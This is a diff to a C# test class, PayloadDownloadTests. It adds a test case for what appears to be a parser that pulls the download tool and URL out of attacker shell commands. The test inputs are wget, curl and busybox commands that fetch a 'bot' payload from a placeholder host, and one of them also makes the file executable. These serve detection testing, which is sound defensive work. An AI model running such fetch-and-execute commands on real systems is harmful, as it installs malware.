@@ -96,6 +96,7 @@ public sealed class PayloadDownloadTests
 
     [Theory]
     [InlineData("wget -q -O /tmp/bot http://example.invalid/bot.sh", "wget", "http://example.invalid/bot.sh")]
+    [InlineData(">/tmp/output wget http://example.invalid/bot", "wget", "http://example.invalid/bot")]
     [InlineData("/usr/bin/curl -fsSL 'https://example.invalid/a?x=1&y=2' -o /tmp/bot", "curl", "https://example.invalid/a?x=1&y=2")]
     [InlineData("/bin/busybox wget -O- ftp://example.invalid/bot", "wget", "ftp://example.invalid/bot")]
     [InlineData("cd /tmp; wget http://example.invalid/bot; chmod +x bot", "wget", "http://example.invalid/bot")]
